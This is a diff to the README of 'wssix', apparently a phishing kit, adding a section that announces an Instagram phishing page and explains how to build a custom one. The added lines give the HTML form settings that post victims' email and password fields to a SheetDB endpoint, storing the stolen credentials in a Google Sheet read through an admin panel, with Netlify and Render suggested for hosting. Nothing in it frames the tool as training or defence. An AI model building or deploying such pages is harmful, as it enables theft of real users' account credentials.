@@ -1,6 +1,6 @@
 
 # wssix
-Create your own phishing tool.
+wssix helps you to create your own phishing tool.
 
 ## Benefits of this tool
 
@@ -54,4 +54,33 @@ For hosting :
 
 - [**Netlify**](https://netlify.com/)
 - [**Render**](https://render.com/)
+
+### Now! we have our own instagram phishing page tool
+
+## Create custom phish page 
+
+- To send data from your **HTML FORM** to google sheets,
+set you form tag **id,method,action and submit** as follow:
+
+```javascript
+<form id="sheetdb-form" method="post" action="https://YOUR_SHEETDB_API">
+```
+
+- Set **name** in username input tag as follow : 
+```javascript
+name="data[email]"
+```
+
+- Set **name** in password input tag as follow : 
+```javascript
+name="data[password]"
+```
+
+- Set Submit button as follow : 
+```javascript
+type="submit" name="submit"
+```
+
+**Now all data from this form is save in your google sheets and you can access it with this **admin panel**.
+
 
